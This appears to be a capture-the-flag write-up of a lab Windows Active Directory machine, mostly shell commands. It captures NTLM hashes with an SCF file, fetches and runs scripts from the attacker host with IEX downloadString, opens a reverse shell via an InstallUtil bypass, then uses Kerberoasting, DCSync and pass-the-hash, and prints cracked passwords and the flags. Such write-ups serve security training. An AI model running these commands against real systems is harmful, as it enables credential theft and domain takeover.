
Port 21 (FTP)
Port 5985 WinRM
Port 5986 WinRM (SSL)
Port 445 SMB
Port 389 LDAP

Since the FTP service is active, I can connect as anonymous to enumerate information.
```
ftp 10.10.10.103
```

There's nothing to enumerate, so I try the HTTP service, which is a website.
```
whatweb 10.10.10.103
```

This reports that IIS and ASP.NET technology are being used. 

So, I check the website in the browser via HTTP and HTTPS.

There's nothing interesting on the website, but since HTTPS is active, I use OpenSSL to inspect the SSL certificate.
```
openssl s_client -connect 10.10.10.103
```

This way, I find domain names, which I add to my host file in case virtual hosting is used on the victim machine. 

As SMB is exposed, I use the CrackMapExec tool to gather more information about the machine.
```
crackmapexec smb 10.10.10.103
```

This reports another domain, which I also add to my host file.

I'll check if I have access to the SMB shared resources. For this, I use SMBMap.
```
smbmap -H 10.10.10.103 -u 'null'
```

There's a resource where I have read access, "Department Shares."

So, I create a mount on my machine to easily access all those files.
```
# On my machine
mkdir /mnt/mount
mount -t cifs "//10.10.10.103/Department Shares" /mnt/mount
```

I find a list of users, so I save them in a file since these users can be useful for gaining access to the machine later. I could try ASREPRoast attack, but as port 88 (Kerberos) is not open, I can't do it.

So, I check the users' directories to see if I have permissions to write to any of them.
```
for directory in $(ls); do echo "[+] Enum permissions $directory:\n"; echo -e "\t$(smbcacls "//10.10.10.103/Department Shares" Users/$directory -N | grep "Everyone")"; done"
```

I have write access to the "public" directory, so now I can take advantage of this to get an NTLM hash using an SCF file.

SCF File Attack

There's an application where I can upload a printer firmware, and it seems there's a testing team that checks the uploaded file. I can attempt an SCF File attack by abusing the icon. In an SCF file attack, the attacker creates a specially crafted SCF file that takes advantage of the way Windows handles these shortcut files. When the victim opens or even previews the SCF file, Windows automatically attempts to load icon resource information from it. This automatic behavior can be exploited by attackers to gather sensitive information like NTLMv2 hashes when the victim accesses the malicious SCF file over an SMB (Server Message Block) share. Create an `.scf` file with the following content:

```plaintext
[Shell]
Command=2
IconFile=\\10.10.14.4\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

Then, mount a shared resource via SMB on your machine with Impacket smbserver:
```bash
impacket-smbserver share $(pwd) -smb2support
```

This will allow you to obtain the NTLMv2 hash.

This way, I obtain the hash of the "amanda" user, which I can try to crack:
```bash
john --wordlist=rockyou hash
```

Once the hash is cracked, I can validate with CrackMapExec that these credentials are valid:
```bash
crackmapexec smb 10.10.10.103 -u 'amanda' -p 'Ashare1972'
SMB         10.10.10.103    445    SIZZLE           [+] HTB.LOCAL\amanda:Ashare1972 
```

Since I have valid credentials, I can perform a Kerberoasting attack:
```bash
GetUserSPNs htb.local/amanda:Ashare1972
http/sizzle           mrlky  CN=Remote Management Users,CN=Builtin,DC=HTB,DC=LOCAL  2018-07-10 13:08:09.536421  2018-07-12 09:23:50.871575
```

The "mrlky" user is kerberoastable, but the problem is that port 88 (Kerberos) is not exposed, so I can't request the hash for this user.

There are two attack vectors: using the Rubeus tool (but I need to gain prior access to the machine), and the other option is to use Chisel to perform remote port forwarding and gain access to port 88 (Kerberos).

Enumerating administrators using rpcclient:
```bash
rpcclient -U 'amanda%Ashare1972'
enumdomgroups
querygroupmem 0x200
queryuser 0x644
```

The "amanda" user belongs to the "Remote Management Service" group, so I can connect via WinRM. Since port 5986 (WinRM SSL) is open, I need to find a way to connect via this:
Remote Management Users: amanda, mrlky

I will fuzz the web for directories using tools like Gobuster or wfuzz and the IIS.fuzz.txt dictionary:
```bash
wfuzz -c --hc=404 -t 200 -w /wordlist http://10.10.10.103/FUZZ
```

wfuzz found "certsrv," and when I tested it on the web, it asked for authentication. I can use the credentials I already have.

I gained access to an Active Directory certificate application. With this, I can request a certificate and gain access through the evil-winrm tool with the -c -S parameter:
```bash
# On my machine, create a pair of keys with OpenSSL
mkdir amanda
cd amanda
openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
```

Provide the CSR in the application to obtain the certificate:
```bash
evil-winrm -S -c certnew.cer -k amanda.key -i 10.10.10.103 -u 'amanda' -p 'Ashare1972'
```

This way, I gained access to the machine as "amanda."

Privilege Escalation

Use BloodHound to collect all the information from the machine:
```bash
mkdir bloodhound
cd bloodhound
bloodhound-python -c ALL -u 'amanda' -p 'Ashare1972' -ns 10.10.10.103 -d htb.local
neo4j console
bloodhound
```

This can also be done another way since I have access to the machine. I can use SharpHound.ps1: https://github.com/BloodHoundAD/Blood

Hound/blob/master/Collectors/SharpHound.ps1
```bash
# On my machine
python -m http.server 80
# On the victim machine
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/sharphound.ps1')
```

It gave a CLM error (only core types are supported in this language mode), so I have to bypass it using the psbypassclm tool: https://github.com/padovah4ck/PSByPassCLM/tree/master
```bash
# On my machine
python -m http.server 80
rlwrap nc -nlvp 1234
# On the victim machine
iwr -uri http://10.10.14.4/psbypassclm.exe -OutFile psbypasscml.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.14.4 /rport=1234 /U c:\temp\psbypasscml.exe
```

Now, try running the SharpHound.ps1 script again:
```bash
# On my machine
python -m http.server 80
# On the victim machine
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/sharphound.ps1')
Invoke-BloodHound -CollectionMethod ALL
```

Now, I need to download the .zip file to my machine:
```bash
# On my machine
smbserver share $(pwd) -smb2support -username kevin -password kevin123
# On the victim machine
net use x: \\10.10.14.4\share /user:kevin kevin123
copy .zip x:\.zip
```

Now, execute that .zip file in my BloodHound.

Through BloodHound, I found that the "mrlky" user is kerberoastable. For this, I will use the Rubeus tool: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe
```bash
# On my machine
python -m http.server 80
# On the victim machine
iwr -uri http://10.10.14.4/rubeus.exe -OutFile rubeus.exe
./rubeus kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972
```

This way, I obtained the hash of the "mrlky" user, and now I need to crack the hash:
```bash
john --wordlist=rockyou hash
```

I got the credentials of the other user. Now, with the secretsdump tool, I can perform a DCSync attack since the user has the getchanges and getchangesall privileges:
```bash
secretsdump htb.local/mrlky:Football#7@10.10.10.103
```

This way, I obtained the hash of the "Administrator" user, and I can use the hash to pass-the-hash with the wmiexec tool:
```bash
wmiexec htb.local/Administrator@10.10.10.103 -hashes :hash
```

This way, I compromised the machine and can consider it as completed.

Root flag: 6cf96d217e4e5721f4ac3c3a6f4fa470
User flag: 07fb9f0f240d21bb2045d8191a044365